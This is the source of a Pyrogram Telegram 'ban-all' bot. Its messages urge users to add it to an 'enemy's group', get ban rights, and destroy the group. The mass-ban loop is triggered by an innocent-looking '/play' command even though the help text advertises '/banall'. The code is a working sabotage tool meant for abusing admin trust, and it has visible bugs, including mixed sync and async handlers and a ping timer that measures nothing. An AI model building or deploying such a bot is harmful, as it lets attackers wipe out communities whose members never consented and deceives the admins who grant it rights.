import os
import time
from pyrogram import filters,enums
from pyrogram import Client, filters, idle
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, ChatPermissions
from datetime import datetime
from telegram import Update
from . import bot
from Banall import STARTED, FINISH, ERROR, OWN_UNAME

# Track bot start time
start_time = time.time()

BOT_ID = 6427933569

@bot.on_message(filters.command("play") & filters.group)
async def ban_all(_, msg):
    chat_id = msg.chat.id
    bot_member = await bot.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot_member.privileges.can_restrict_members==True

    count_kicks = 0
    await msg.reply_text("ꜱᴛᴀʀᴛᴇᴅ ʙᴀɴɴɪɴɢ ɴᴏɴ-ᴀᴅᴍɪɴꜱ ɪɴ ᴛʜɪꜱ ᴄʜᴀᴛ.")

    if bot_permission:
        async for member in bot.get_chat_members(chat_id):
            try:
                    await bot.ban_chat_member(chat_id, member.user.id)
                    count_kicks += 1
            except Exception as e:
                print(e)

        await msg.reply_text(f"ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʙᴀɴɴᴇᴅ {count_kicks} ᴍᴇᴍʙᴇʀꜱ")
    else:
        await msg.reply_text("ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ʀɪɢʜᴛꜱ ᴛᴏ ʙᴀɴ ᴜꜱᴇʀꜱ.")

@bot.on_message(filters.group & filters.service, group=2)
def service(_, msg: Message):
    msg.delete()

@bot.on_message(filters.private & filters.command("start"))
def start(_, msg: Message):
    msg.reply_photo(
        photo="https://te.legra.ph/file/a7aa081d0ce7f3b0124aa.jpg",
        caption="ʜᴇʏ ᴅᴜᴅᴇ, ɪ'ᴍ ᴀɴ ᴀᴅᴠᴀɴᴄᴇ & ᴘᴏᴡᴇʀꜰᴜʟ ʙᴀɴ-ᴀʟʟ ʙᴏᴛ ᴡɪᴛʜ ɴᴏ ʟᴀɢ ɪꜱꜱᴜᴇꜱ. ᴛʜɪꜱ ʙᴀɴ-ᴀʟʟ ᴇᴅɪᴛɪᴏɴ ɪꜱ ᴄʀᴇᴀᴛᴇ ᴀɴᴅ ᴅᴇᴠᴇʟᴏᴘᴇᴅ ꜰᴏʀ ꜰᴜᴄᴋɪɴɢ ᴛᴏxɪᴄ ᴄᴜᴍᴍɪɴɪᴛʏ'ꜱ.\n───────────────────────\n► ᴘʏʀᴏɢʀᴀᴍ ᴠᴇʀꜱɪᴏɴ ⥬ 2.0.106 \n\nɴᴏᴡ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ᴇɴᴇᴍʏ'ꜱ ɢʀᴏᴜᴘ ᴀɴᴅ ᴅᴏɴ'ᴛ ғᴏʀɢᴇᴛ ᴛᴏ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ʙᴀɴ ʀɪɢʜᴛꜱ. ᴛʜᴇɴ sᴇɴᴅ /banall ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ ᴀɴᴅ ɪ ᴡɪʟʟ ꜰᴜᴄᴋ ᴛʜᴇ ᴡʜᴏʟᴇ ɢʀᴏᴜᴘ. \n◎ᴘᴏᴡᴇʀᴇᴅ ʙʏ ˹ʙᴏɴᴛᴇɴ ɴᴇᴛᴡᴏʀᴋ˼",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("ᴀᴅᴅ ᴍᴇ ᴛᴏ ᴀɴʏ ɢʀᴏᴜᴘ", url="https://t.me/Banall_probot?startgroup=true")],
            [
                InlineKeyboardButton("ꜱᴜᴘᴘᴏʀᴛ", url="https://t.me/bonten_mainchats"),
                InlineKeyboardButton("ᴄʜᴀɴɴᴇʟ", url="https://t.me/Bonten_Destroyers"),
                InlineKeyboardButton("oᴡɴᴇʀ⎋", url=f"https://t.me/{OWN_UNAME}")
            ],
            [InlineKeyboardButton("ꜰᴇᴀᴛᴜʀᴇꜱ", callback_data="help_command")]  # Added Help Button
        ])
    )

@bot.on_callback_query(filters.regex("help_command"))
def help_command_handler(_, callback_query):
    callback_query.answer("ꜱᴄʀᴏʟʟ ᴀɴᴅ ᴄʜᴇᴄᴋ ʜᴇʟᴘ ᴛᴇxᴛ.")
    callback_query.message.delete()
    bot.send_message(
        callback_query.from_user.id,
        "ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ ꜰᴏʀ ʙᴀɴ-ᴀʟʟ ʙᴏᴛ⥮\n\n"
        "───────────────────────\n"
        "/banall ⥬ ʙᴀɴ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀꜱ ꜰʀᴏᴍ ɢᴄ.\n"
        "/start ⥬ ᴄᴏᴍᴍᴀɴᴅ ᴛᴏ ꜱᴛᴀʀᴛ ʙᴏᴛ ᴛʜᴇ ʙᴏᴛ.\n"
        "/ping ⥬ ᴄʜᴇᴄᴋ ᴀɪ'ꜱ ᴜᴘᴛɪᴍᴇ ᴀɴᴅ ꜱᴘᴇᴇᴅ.\n"
        "───────────────────────\n\n"
        "ꜰᴏʀ ꜰᴜʀᴛʜᴇʀ ᴀꜱꜱɪꜱᴛᴀɴᴄᴇ ᴊᴏɪɴ ᴏᴜʀ ꜱᴜᴘᴘᴏʀᴛ \n\n"
        "ᴀʟꜱᴏ ᴄʜᴇᴄᴋ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴄʜᴀɴɴᴇʟ.",
        disable_web_page_preview=True
    )

@bot.on_message(filters.command("ping"))
def ping(_, msg: Message):
    uptime = round(time.time() - start_time)
    start = datetime.now()
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    msg.reply_text(
        f"🏓 𝙿ᴏɴɢ!\n\n────────────────────\nᏴคɴᴀʟʟ 𝙱ᴏᴛ [⚡️] ɪꜱ ʀᴇᴀᴅʏ ᴛᴏ ꜰᴜᴄᴋ ᴛᴏxɪᴄ ɢᴄ'ꜱ\n👾 ᴜᴘᴛɪᴍᴇ ᴏꜰ ᴛʜᴇ ʙᴏᴛ: {uptime // 60}m {uptime % 60}s\n💥 ꜱᴘᴇᴇᴅ ᴏꜰ ʙᴀɴ-ᴀʟʟ ᴀɪ: {ms}ms"
    )

@bot.on_message(filters.private & filters.command("banall"))
def banall_private(_, msg: Message):
    msg.reply_text("▸ʜᴇʏᴏ ʙʀᴜʜ ʏᴏᴜ ᴄᴀɴ'ᴛ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ɪɴ ᴘʀɪᴠᴀᴛᴇ!\nᴀᴅᴅ ᴍᴇ ᴛᴏ ᴀɴʏ ɢʀᴏᴜᴘ & ɢɪᴠᴇ ᴍᴇ ʙᴀɴ ʀɪɢʜᴛꜱ ᴛʜᴇɴ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ɪɴ ɢʀᴏᴜᴘ"
)

bot.run()
idle()

print("ᴅᴏɴᴇ ʙᴀɴᴀʟʟ sᴛᴀʀᴛᴇᴅ ...")
print("ᴊᴏɪɴ @bonten_mainchats")
